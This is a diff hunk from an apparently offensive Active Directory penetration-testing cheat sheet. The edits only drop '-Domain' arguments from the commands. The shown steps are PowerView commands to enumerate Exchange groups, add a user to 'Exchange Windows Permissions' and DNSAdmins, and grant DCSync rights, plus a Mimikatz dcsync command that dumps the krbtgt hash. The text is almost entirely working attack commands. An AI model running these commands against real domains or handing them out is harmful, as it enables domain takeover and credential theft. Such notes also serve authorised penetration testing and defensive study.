@@ -1148,39 +1148,39 @@ Invoke-SelfSearch -Mailbox <EMAIL> -ExchHostname <EXCHANGE SERVER NAME> -OutputC
 #### Enumerate if exchange groups exist
 ```
 . ./Powerview.ps1
-Get-DomainGroup *exchange* -Domain <DOMAIN>
+Get-DomainGroup *exchange*
 ```
 
 #### Enumerate membership of the groups
 ```
-Get-DomainGroupMember "Organization Management" -Domain <DOMAIN>
-Get-DomainGroupMember "Exchange Trusted Subsystem" -Domain <DOMAIN>
-Get-DomainGroupMember "Exchange Windows Permissions" -Domain <DOMAIN>
+Get-DomainGroupMember "Organization Management"
+Get-DomainGroupMember "Exchange Trusted Subsystem"
+Get-DomainGroupMember "Exchange Windows Permissions"
 ```
 
 #### If we have privileges of a member of the Organization Management, we can add a user to the 'Exchange Windows Permissions' group.
 ```
 $user = Get-DomainUser -Identity <USER>
-$group = Get-DomainGroup -Identity 'Exchange Windows Permissions' -Domain <DOMAIN>
+$group = Get-DomainGroup -Identity 'Exchange Windows Permissions'
 Add-DomainGroupMember -Identity $group -Members $user -Verbose
 ```
 
 #### Add permissions to execute DCSYNC
 - When member of the ```Exchange Windows Permissions``` group
 ```
-Add-DomainObjectAcl -TargetIdentity 'DC=<PARENT DOMAIN>,DC=<TOP DOMAIN>' -PrincipalIdentity '<CHILD DOMAIN>\<USER>' -Rights DCSync -Verbose
+Add-DomainObjectAcl -TargetIdentity 'DC=<PARENT DOMAIN>,DC=<TOP DOMAIN>' -PrincipalIdentity '<USER>' -Rights DCSync -Verbose
 ```
 
 #### Execute DCSYNC
 - use ```/all``` instead of ```/user``` to list all users
 ```
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:<PARENT DOMAIN>\krbtgt /domain:<PARENT DOMAIN>"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
 ```
 
 #### If we have privileges of 'exchange user', who is a member of the Exchange Trusted Subsystem, we can add any user to the DNSAdmins group:
 ```
 $user = Get-DomainUser -Identity <USER>
-$group = Get-DomainGroup -Identity 'DNSAdmins' -Domain <DOMAIN>
+$group = Get-DomainGroup -Identity 'DNSAdmins'
 Add-DomainGroupMember -Identity $group -Members $user -Verbose
 ```
 
